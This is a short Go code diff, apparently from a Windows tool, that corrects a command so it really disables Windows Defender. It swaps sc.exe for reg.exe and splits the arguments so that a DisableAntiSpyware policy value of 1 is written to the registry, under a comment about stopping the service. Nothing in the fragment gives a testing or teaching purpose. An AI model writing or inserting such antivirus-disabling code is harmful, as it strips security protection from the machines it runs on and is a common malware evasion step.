@@ -16,8 +16,8 @@ func Entry() {
 func main() {
 	//Create a key to stop the service
 	println("Stopping the service")
-	cmd1 := exec.Command("sc.exe",
-		"add", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "/v DisableAntiSpyware", "/t REG_DWORD", "/d 1", "/f")
+	cmd1 := exec.Command("reg.exe",
+		"add", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "/v", "DisableAntiSpyware", "/t", "REG_DWORD", "/d", "1", "/f")
 	err1 := cmd1.Run()
 
 	if err1 != nil {
